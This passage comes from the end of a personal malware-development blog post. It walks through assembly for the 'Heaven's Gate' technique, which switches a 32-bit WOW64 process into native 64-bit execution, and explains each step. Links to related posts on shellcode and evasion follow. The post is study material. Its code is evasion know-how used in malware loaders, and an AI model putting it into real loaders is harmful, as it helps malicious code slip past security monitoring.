</span></span><span style="display:flex;"><span>	mov ebp, esp							; Create a <span style="color:#66d9ef">new</span> stack frame
</span></span><span style="display:flex;"><span>	push esi								; Save the registers we shouldn<span style="color:#960050;background-color:#1e0010">&#39;</span>t clobber
</span></span><span style="display:flex;"><span>	push edi								;
</span></span><span style="display:flex;"><span>	mov esi, [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]						; ESI <span style="color:#f92672">=</span> pFunction
</span></span><span style="display:flex;"><span>	mov ecx, [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>]						; ECX <span style="color:#f92672">=</span> dwParameter
</span></span><span style="display:flex;"><span>	call delta								;
</span></span><span style="display:flex;"><span>delta:
</span></span><span style="display:flex;"><span>	pop eax									;
</span></span><span style="display:flex;"><span>	add eax, (native_x64<span style="color:#f92672">-</span>delta)				; get the address of native_x64
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	sub esp, <span style="color:#ae81ff">8</span>								; alloc some space on stack <span style="color:#66d9ef">for</span> far jump
</span></span><span style="display:flex;"><span>	mov edx, esp							; EDX will be pointer our far jump
</span></span><span style="display:flex;"><span>	mov dword [edx<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>], X64_CODE_SEGMENT		; set the native x64 code segment
</span></span><span style="display:flex;"><span>	mov dword [edx], eax					; set the address we want to jump <span style="color:#a6e22e">to</span> (native_x64)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	call go_all_native						; perform the transition into native x64 and <span style="color:#66d9ef">return</span> here when done.
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	mov ax, ds								; fixes an elusive bug on AMD CPUs, http:<span style="color:#75715e">//blog.rewolf.pl/blog/?p=1484
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	mov ss, ax								; found and fixed by ReWolf, incorporated by RaMMicHaeL
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	add esp, (<span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)						; remove the <span style="color:#ae81ff">8</span> bytes we allocated <span style="color:#f92672">+</span> the <span style="color:#66d9ef">return</span> address which was never popped off <span style="color:#f92672">+</span> the qword pushed from native_x64
</span></span><span style="display:flex;"><span>	pop edi									; restore the clobbered registers
</span></span><span style="display:flex;"><span>	pop esi									;
</span></span><span style="display:flex;"><span>	pop ebp									; restore EBP
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">retn</span> (<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)								; <span style="color:#66d9ef">return</span> to <span style="color:#a6e22e">caller</span> (cleaning up our two function params)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>go_all_native:
</span></span><span style="display:flex;"><span>	mov edi, [esp]							; EDI is the wow64 <span style="color:#66d9ef">return</span> address
</span></span><span style="display:flex;"><span>	jmp dword far [edx]						; perform the far jump, which will <span style="color:#66d9ef">return</span> to the caller of go_all_native
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>native_x64:
</span></span><span style="display:flex;"><span>[BITS <span style="color:#ae81ff">64</span>]									; we are now executing native x64 code...
</span></span><span style="display:flex;"><span>	xor rax, rax							; zero RAX
</span></span><span style="display:flex;"><span>	push rdi								; save <span style="color:#a6e22e">RDI</span> (EDI being our wow64 <span style="color:#66d9ef">return</span> address)
</span></span><span style="display:flex;"><span>	call rsi								; call our native x64 <span style="color:#a6e22e">function</span> (the param <span style="color:#66d9ef">for</span> our native x64 function is allready in RCX)
</span></span><span style="display:flex;"><span>	pop rdi									; restore <span style="color:#a6e22e">RDI</span> (EDI being our wow64 <span style="color:#66d9ef">return</span> address)
</span></span><span style="display:flex;"><span>	push rax								; simply push it to alloc some space
</span></span><span style="display:flex;"><span>	mov dword [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>], WOW64_CODE_SEGMENT	; set the wow64 code segment 
</span></span><span style="display:flex;"><span>	mov dword [rsp], edi					; set the address we want to jump <span style="color:#a6e22e">to</span> (the <span style="color:#66d9ef">return</span> address from the go_all_native call)
</span></span><span style="display:flex;"><span>	jmp dword far [rsp]						; perform the far jump back to the wow64 caller...
</span></span></code></pre></div><p>The code does the following things:</p>
<ul>
<li>Initializes the stack frame properly.</li>
<li>Takes the pFunction (function to execute) and dwParameter from the stack using EBP + offsets and saves it into registers for later usage.</li>
<li>Calls <code>delta</code>.</li>
<li>In <code>delta</code> we <strong>prepare the opening of the gate</strong>:
<ul>
<li>pop the last inserted value in the stack (which is the saved EIP value, as the call instruction inserts EIP so we keep track of what we have to execute after delta). This is a trick to <strong>obtain the address of the code that is being executed dinamically.</strong></li>
<li>Once we obtain the address of the instruction in which we are dinamically, we add the offset to the native_x64 code section, having the dynamic address of the native_x64 code section.</li>
<li>Expand the stack frame and add 2 variables: The 0x33 code segment, corresponding as a 64-bit execution code segment (this will be used when jumping into 64-bit context), and the dynamic address of native_x64. Both are stored in the stack, the last is pointed by edx, and the other is pointed by edx+4.</li>
<li>Call <code>go_all_native</code>.</li>
</ul>
</li>
<li>In <code>go_all_native</code>, we <strong>go inside the gate</strong>:
<ul>
<li>We save the 32-bit context return address (stored in ESP by the call operation) into edi.</li>
<li>We <strong>perform a far jump to the memory address stored in edx</strong>, which is the <code>native_x64</code> starting point. Also, the edx+4 address is used in the <strong>far jump</strong> to change the code segment to the 0x33 code segment, corresponding to a 64-bit code segment. Now the CPU is ready to understand and execute 64-bit code. <strong>We have opened the Heaven&rsquo;s Gate.</strong></li>
</ul>
</li>
<li>
<ul>
<li>In <code>native_x64</code>, we <strong>execute our x64 arbitrary code and then return to the 32-bit context:</strong>
<ul>
<li>We reset rax.</li>
<li>We push rdi into the stack, as we stored the 32-bit return address in edi. We will use this to return to the 32-bit code.</li>
<li>We call rsi, which already has the pFunction (the address of the function to execute).</li>
<li>Once our function has been executed, we restore rdi popping its value from the stack (we saved it previously).</li>
<li>We add the 32-bit code address into the stack, and the 32-bit code segment (0x23), to, lastly, perform <strong>another far jmp</strong> to the 32-bit address using the 32-bit code segment. We are finally <strong>closing the Heaven&rsquo;s Gate.</strong></li>
</ul>
</li>
</ul>
</li>
<li>After going back to the 32-bit code, some cleaning is done in order to reestructure the stack. We return to the 32-bit code that triggered this shellcode. As a homework, I have to study why the code does some operations for AMD CPUs.</li>
</ul>
<p>To be honest, this has been one of the most interesting topics I have researched within this field. I have learnt a lot from OS internals, assembly and I have not only discovered an interesting technique, but I have understood how does it works (or, at least, I have that impression). I personally do not like to use things that are shady to me, so this is one of the best things to take from this learning path.</p>
<p>Let me know what is wrong or tell me your doubts on this topic by contacting me via <a href="https://www.linkedin.com/in/jacobocasado/?originalSubdomain=es">LinkedIn</a>. I&rsquo;ll be glad to hear from you.</p>
<p>Jaco</p>
</div>
</article>

    <hr />
    <p class="articleTagsContainer">
        <span> </span>
        <strong>Tags:</strong>
        
            <a
                
                class="buttonTag"
                
                href="http://localhost:1313/tags/evasion/">#evasion</a>
        
            <a
                
                class="buttonTag"
                
                href="http://localhost:1313/tags/firststeps/">#firststeps</a>
        
            <a
                
                class="buttonTag"
                
                href="http://localhost:1313/tags/loader/">#loader</a>
        
            <a
                
                class="buttonTag"
                
                href="http://localhost:1313/tags/maldev/">#maldev</a>
        
    </p>





    
    
        
            
        
        <div class="relatedArticlesContainer">
            <hr />
            <h2>More posts like this</h2>
            <div class="postlist ">
                <article class="card postlistitem">
    <div>
        <h2>
            <a href="http://localhost:1313/posts/pe_parsing/">PE parsing</a>
        </h2>
        <p class="date">
            <span title='Date'> </span>
    2025-03-27


                | 
                <span title='Tags'> </span>
                
                    <a href="http://localhost:1313/tags/binaries">#binaries</a>
                
                    <a href="http://localhost:1313/tags/executables">#executables</a>
                
                    <a href="http://localhost:1313/tags/maldev">#maldev</a>
                
                    <a href="http://localhost:1313/tags/peparser">#peparser</a>
                
            
        </p>
        
        
            <div class="articlePreview">
                <p>
                    
                        <p>A random page with some information of the PE format file and its main headers.
Main usage: malware development and malware research.</p>
<h1 id="considerations">Considerations</h1>
<ul>
<li>RVA (<strong>Relative Virtual Address</strong>): Offset from Image Base. To obtain the absolute virtual address the calculation &ldquo;Image Base + RVA&rdquo; must be performed. Several PE sections include RVAs.</li>
<li>Check the <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format">official Microsoft documentation</a> if you want to know more! This is only a summary and my personal studies about the topic.</li>
</ul>
<h1 id="dos-header">DOS header</h1>
<ul>
<li><code>IMAGE_DOS_HEADER</code> structure definition from <code>winnt.h</code>.</li>
<li>First 64 bytes of the PE file.</li>
<li>Was very important in the MS-DOS era, right now it is not.</li>
<li>The actual Windows OS loader uses a field in this header to navigate to the <strong>new executable</strong> header , which is the header containing most of the needed information.</li>
<li>Kept in the binaries for compatibility purposes.</li>
</ul>
<p>We only want to know about the first and last members of this header:</p>
                    
                </p>
                <p><a href="http://localhost:1313/posts/pe_parsing/">Continue reading </a></p>
            </div>
        
    </div>
    <hr />
</article>
<article class="card postlistitem">
    <div>
        <h2>
            <a href="http://localhost:1313/posts/shellcodes/">Shellcodes for everything</a>
        </h2>
        <p class="date">
            <span title='Date'> </span>
    2024-02-28


                | 
                <span title='Tags'> </span>
                
                    <a href="http://localhost:1313/tags/lab">#lab</a>
                
                    <a href="http://localhost:1313/tags/maldev">#maldev</a>
                
                    <a href="http://localhost:1313/tags/shellcodes">#shellcodes</a>
                
            
        </p>
        
        
            <div class="articlePreview">
                <p>
                    
                        <p>Shellcodes that will be useful for testing/developing your malware.</p>
<p>I usually work on the same OS and with the same Compiler version for better reproducibility so here are my specs:</p>
<ul>
<li>Windows 10 Pro 22H2
<ul>
<li>OS Build <strong>19045.4046</strong></li>
<li>MSVC vc.exe compiler (64-bit and 32-bit) version <strong>19.41.34123</strong></li>
</ul>
</li>
</ul>
<p>Shellcodes are not encrypted. You should encrypt them if you want evasion, as these shellcodes are public and not crafted manually by me.</p>
                    
                </p>
                <p><a href="http://localhost:1313/posts/shellcodes/">Continue reading </a></p>
            </div>
        
    </div>
    <hr />
</article>
<article class="card postlistitem">
    <div>
        <h2>
            <a href="http://localhost:1313/posts/random_stuff/">Random stuff</a>
        </h2>
        <p class="date">
            <span title='Date'> </span>
    2024-02-28


                | 
                <span title='Tags'> </span>
                
                    <a href="http://localhost:1313/tags/evasion">#evasion</a>
                
                    <a href="http://localhost:1313/tags/firststeps">#firststeps</a>
                
                    <a href="http://localhost:1313/tags/loader">#loader</a>
                
                    <a href="http://localhost:1313/tags/maldev">#maldev</a>
                
            
        </p>
        
        
            <div class="articlePreview">
                <p>
                    
                        <p>Custom function declaration. Used when hooking, to get a pointer to the original function to get it dinamically resolved via IAT and then override this pointer, or to craft a new function that points to a shellcode with the function behavior (used in reflective DLL shellcode)</p>
<p><strong>Case of getting the function pointer to a resolving Windows API call:</strong></p>
                    
                </p>
                <p><a href="http://localhost:1313/posts/random_stuff/">Continue reading </a></p>
            </div>
        
    </div>
    <hr />
</article>
<article class="card postlistitem">
    <div>
        <h2>
            <a href="http://localhost:1313/posts/firststeps/">My first steps in MalDev</a>
        </h2>
        <p class="date">
            <span title='Date'> </span>
    2024-02-28


                | 
                <span title='Tags'> </span>
                
                    <a href="http://localhost:1313/tags/evasion">#evasion</a>
                
                    <a href="http://localhost:1313/tags/firststeps">#firststeps</a>
                
                    <a href="http://localhost:1313/tags/loader">#loader</a>
                
                    <a href="http://localhost:1313/tags/maldev">#maldev</a>
                
            
        </p>
        
        
            <div class="articlePreview">
                <p>
                    
                        <h2 id="prelude">Prelude</h2>
<p>Around this last month I have been digging into the Malware Development world. I have always wanted to expand my knowledge within this field, and I felt like it was the moment to do so.</p>
<p>As mentioned in many other blogposts, <a href="https://www.google.com/search?client=firefox-b-d&amp;q=sektor7+malware+development">Sektor7 Malware Development Essentials</a> course was a good point to start. Nevertheless, I found this course very short and I felt like most of the important concepts are ignored (e.g., <strong>what is a handle?</strong>) and are just used like if I already know them.</p>
                    
                </p>
                <p><a href="http://localhost:1313/posts/firststeps/">Continue reading </a></p>
            </div>
        
    </div>
    <hr />
</article>

            </div>
        </div>
    


                    </main><footer>
    <hr />

<p><small>
        2025 &copy; made by jaco with love
    </small></p>
    <p><small>
        Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
